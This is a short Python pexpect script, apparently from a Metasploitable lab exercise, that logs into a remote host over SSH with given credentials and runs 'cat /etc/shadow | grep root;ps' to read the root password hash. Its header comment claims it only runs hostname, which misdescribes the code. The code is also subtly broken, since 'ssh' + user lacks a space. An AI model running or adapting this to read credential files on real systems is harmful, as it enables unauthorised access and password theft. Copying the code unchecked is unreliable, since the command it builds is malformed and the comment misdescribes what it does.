import pexpect
from get_target import *

# logs into remote systems and runs hostname

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    child = pexpect.spawn('ssh' + user + '@' + host)
    ssh_new_key = 'Are you sure you want to continue connecting'
    match = child.expect([pexpect.TIMEOUT, ssh_new_key, '[P|p]assword: '])
    if match == 0:
        print('[-] Error Connecting')
        return
    if match == 1:
        child.sendline('yes')
        match = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if match == 0:
            print('[-] Error Connecting')
            return

    child.sendline(password)
    child.expect(PROMPT)

    return child


def main():
    # host = '192.168.1.78'
    # user = 'msfadmin'
    # password = 'msfadmin'
    user, host, password = get_target()
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root;ps')


main()
